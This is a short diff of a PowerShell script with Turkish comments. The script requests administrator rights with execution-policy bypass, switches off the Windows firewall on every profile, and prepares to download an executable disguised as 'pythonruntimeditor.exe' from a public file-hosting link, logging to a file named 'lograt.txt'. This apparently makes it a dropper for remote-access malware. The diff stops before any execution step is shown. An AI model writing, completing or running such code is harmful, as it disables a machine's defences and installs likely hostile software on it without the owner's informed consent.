@@ -1,17 +1,21 @@
-# Yöneticilik kontrolü, yoksa yeni bir PowerShell oturumu başlatılır
-if (-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\PowerShellAdmin")) {
+# Yönetici yetkisi istemek
+$isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
+$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
+
+if (-not ($isAdmin.IsInRole($adminRole))) {
+    # Eğer yönetici değilse, yönetici olarak scripti başlat
     Start-Process powershell -ArgumentList "Start-Process PowerShell -ArgumentList '-NoExit', '-ExecutionPolicy Bypass', '-Command $MyInvocation.MyCommand.Path'" -Verb RunAs
     exit
 }
 
-# Firewall kapatma
+# Firewall'ı kapatmak için fonksiyon
 function Disable-Firewall {
     Write-Host "Firewall kapatılıyor..."
     Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
     Write-Host "Firewall kapalı!"
 }
 
-# Dosya indir
+# Dosya indir ve kontrol et
 $exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
 $localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"
 $logFile = "C:\Users\dogud\Downloads\lograt.txt"
